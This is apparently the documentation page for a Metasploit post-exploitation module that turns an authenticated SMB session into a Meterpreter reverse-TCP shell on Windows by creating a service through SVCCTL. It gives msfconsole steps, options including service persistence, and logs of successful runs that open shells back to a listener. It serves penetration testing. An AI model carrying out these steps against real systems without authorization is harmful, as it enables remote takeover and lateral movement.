## Vulnerable Application

This module upgrades an authenticated SMB session to a Meterpreter session using
PsExec techniques. It leverages the existing authenticated SMB connection to create
and start a Windows service on the target that executes a Meterpreter payload.

### Prerequisites

1. An authenticated SMB session (`Msf::Sessions::SMB`) obtained via modules such as
   `auxiliary/scanner/smb/smb_login` or relay attacks with the `SMB_SESSION_TYPE`
   feature flag enabled.
2. The authenticated user must have administrative privileges on the target system,
   as the module requires access to the Windows Service Control Manager (SVCCTL).
3. The target must be a Windows system reachable over SMB (port 445).

### How It Works

The module connects to the `IPC$` share using the existing session credentials, binds
to the SVCCTL named pipe, creates a Windows service configured to execute a Meterpreter
reverse TCP payload, and starts the service. Once the payload executes, the service is
cleaned up automatically unless `SERVICE_PERSIST` is set.

## Verification Steps

1. Start msfconsole
1. Obtain an authenticated SMB session (e.g. via `auxiliary/scanner/smb/smb_login` with `CreateSession` set to `true`)
1. Do: `use post/windows/manage/smb_to_meterpreter`
1. Do: `set SESSION <smb_session_id>`
1. Do: `set LHOST <your_listener_ip>`
1. Do: `run`
1. You should get a Meterpreter session on the target.

Alternatively, you can upgrade directly from the sessions command:

1. Do: `sessions -u <smb_session_id>`
1. The framework routes the SMB session to this module automatically.

## Options

### HANDLER

When set to `true`, the module automatically starts an `exploit/multi/handler` to
receive the incoming Meterpreter connection. Set to `false` if you have a handler
running separately. (Default: `true`)

### TARGET_ARCH

The target architecture. Determines which Meterpreter payload variant is used.
Accepted values: `x86`, `x64`. (Default: `x64`)

When no explicit payload is specified, the module selects a Meterpreter reverse TCP
payload based on this option:

- `x64`: `windows/x64/meterpreter/reverse_tcp`
- `x86`: `windows/meterpreter/reverse_tcp`

### Advanced Options

#### PAYLOAD_OVERRIDE

Define the payload to use instead of the auto-selected `meterpreter/reverse_tcp`
variant. When not set, the module picks based on `TARGET_ARCH`.

#### SERVICE_NAME

A custom name for the Windows service created on the target. If not set, a random
alphanumeric name between 8 and 16 characters is generated.

#### SERVICE_PERSIST

When set to `true`, the module skips service deletion after execution, leaving the
service on the target. Useful for debugging or persistence scenarios. (Default: `false`)

#### HANDLE_TIMEOUT

How long (in seconds) to wait for the Meterpreter session to connect back before
reporting a timeout failure. (Default: `30`)

## Scenarios

### sessions -u <smb_session_id>

```msf
msf auxiliary(scanner/smb/smb_login) > sessions -u -1
[*] Executing 'post/windows/manage/smb_to_meterpreter' on session: [-1]
[!] SESSION may not be compatible with this module:
[!]  * Unknown session arch
[!]  * Unknown session platform. This module works with: Windows.
[*] Starting exploit/multi/handler on 10.15.200.61:4444
[*] Started reverse TCP handler on 10.15.200.61:4444
[*] Uploaded payload to \\172.16.158.182\ADMIN$\unFxBvVr.exe
[*] Bound to \svcctl
[*] Creating service BkAPktWzvIFv...
[*] Starting the service...
[*] Sending stage (248902 bytes) to 10.15.200.61
[+] Service started successfully
[!] Could not stop service 'BkAPktWzvIFv': Error returned when sending a control to the service: (0x00000426) ERROR_SERVICE_NOT_ACTIVE: The service has not been started.
[+] Service 'BkAPktWzvIFv' deleted successfully
[+] Deleted \\172.16.158.182\ADMIN$\unFxBvVr.exe
[*] Waiting up to 30 seconds for Meterpreter session...
[+] Meterpreter session opened successfully!
msf auxiliary(scanner/smb/smb_login) > [*] Meterpreter session 2 opened (10.15.200.61:4444 -> 10.15.200.61:64160) at 2026-06-18 13:13:07 +0100

msf auxiliary(scanner/smb/smb_login) > sessions -1
[*] Starting interaction with 2...

meterpreter > pwd
C:\Windows\system32
meterpreter >
```

### smb_to_meterpreter

```msf
msf post(windows/manage/smb_to_meterpreter) > run
[!] SESSION may not be compatible with this module:
[!]  * Unknown session arch
[!]  * Unknown session platform. This module works with: Windows.
[*] Starting exploit/multi/handler on 172.16.158.1:4444
[*] Started reverse TCP handler on 172.16.158.1:4444
[*] Uploaded payload to \\172.16.158.182\ADMIN$\kPjRNEHs.exe
[*] Bound to \svcctl
[*] Creating service gfAiBDOkmQDe...
[*] Starting the service...
[*] Sending stage (248902 bytes) to 172.16.158.182
[+] Service started successfully
[!] Could not stop service 'gfAiBDOkmQDe': Error returned when sending a control to the service: (0x00000426) ERROR_SERVICE_NOT_ACTIVE: The service has not been started.
[+] Service 'gfAiBDOkmQDe' deleted successfully
[+] Deleted \\172.16.158.182\ADMIN$\kPjRNEHs.exe
[*] Waiting up to 30 seconds for Meterpreter session...
[+] Meterpreter session opened successfully!
[*] Post module execution completed
msf post(windows/manage/smb_to_meterpreter) > [*] Meterpreter session 3 opened (172.16.158.1:4444 -> 172.16.158.182:49309) at 2026-06-18 13:15:39 +0100

msf post(windows/manage/smb_to_meterpreter) > sessions -1
[*] Starting interaction with 3...

meterpreter > pwd
C:\Windows\system32
meterpreter >
```
